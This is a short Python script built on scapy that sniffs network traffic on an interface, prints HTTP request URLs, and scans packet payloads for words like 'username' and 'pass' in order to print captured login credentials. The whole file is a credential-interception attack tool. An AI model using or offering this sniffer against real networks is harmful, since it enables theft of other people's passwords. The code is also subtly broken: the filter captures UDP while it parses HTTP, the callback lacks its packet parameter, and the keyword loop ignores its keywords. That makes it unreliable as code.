#!/usr/bin/env python
# pip install scapy_http


import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="udp")

# filters : tcp / arp / port 21 / port 80 ...

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username","user","login","pass"]
        for keyword in keywords:
            if 'username' in load:
                return load 


def process_sniffed_packet():
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show() )
        url = get_url(packet)
        print("HTTP REQUEST --- --- " + url.decode())
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n Credentials --- --- --- " + login_info + "\n\n")

    
sniff("eth0")